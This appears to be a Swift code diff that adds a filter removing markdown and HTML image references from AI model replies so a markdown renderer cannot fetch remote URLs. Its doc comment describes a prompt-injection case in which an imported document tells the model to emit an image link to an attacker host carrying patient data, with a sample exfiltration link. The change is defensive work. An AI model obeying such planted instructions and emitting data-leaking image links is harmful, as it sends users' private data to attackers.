@@ -105,6 +105,9 @@ struct AIResponseCleaner {
         // Remove special tokens
         cleaned = removeSpecialTokens(from: cleaned)
 
+        // Neutralise remote images before the markdown renderer can fetch them
+        cleaned = removingRemoteImages(from: cleaned)
+
         // Clean up excessive whitespace
         cleaned = normalizeWhitespace(in: cleaned)
 
@@ -112,6 +115,49 @@ struct AIResponseCleaner {
         cleaned = cleaned.trimmingCharacters(in: .whitespacesAndNewlines)
 
         return cleaned
+    }
+
+    // MARK: - Remote Images
+
+    /// Strips image references from model output before it reaches the markdown renderer.
+    ///
+    /// `StructuredText` renders assistant replies, and Textual's `ImageLoader` fetches any
+    /// image URL it finds, with no allowlist. That turns a rendered reply into an outbound
+    /// request the user never asked for: text inside an imported document can ask the model
+    /// to emit `![](https://attacker/?d=<patient data>)`, and simply displaying the answer
+    /// would send it. It also quietly breaks the on-device promise, since a "fully private"
+    /// local reply could still reach the network.
+    ///
+    /// The alt text is kept so the reply still reads sensibly; only the fetch disappears.
+    static func removingRemoteImages(from text: String) -> String {
+        var result = text
+
+        // Markdown images: ![alt](url) and ![alt][ref] → [image: alt]
+        let markdownImage = try? NSRegularExpression(
+            pattern: #"!\[([^\]]*)\]\s*[\(\[][^\)\]]*[\)\]]"#,
+            options: []
+        )
+        if let markdownImage {
+            result = markdownImage.stringByReplacingMatches(
+                in: result,
+                options: [],
+                range: NSRange(result.startIndex..., in: result),
+                withTemplate: "[image: $1]"
+            )
+        }
+
+        // Raw <img> tags, which some models emit despite being asked for markdown.
+        let htmlImage = try? NSRegularExpression(pattern: #"<img\b[^>]*>"#, options: [.caseInsensitive])
+        if let htmlImage {
+            result = htmlImage.stringByReplacingMatches(
+                in: result,
+                options: [],
+                range: NSRange(result.startIndex..., in: result),
+                withTemplate: "[image]"
+            )
+        }
+
+        return result
     }
 
     // MARK: - Private Cleaning Methods
@@ -239,6 +285,9 @@ struct AIResponseCleaner {
 
         // Remove special tokens
         cleaned = removeSpecialTokens(from: cleaned)
+
+        // Neutralise remote images before the markdown renderer can fetch them
+        cleaned = removingRemoteImages(from: cleaned)
 
         // Clean up excessive whitespace
         cleaned = normalizeWhitespace(in: cleaned)
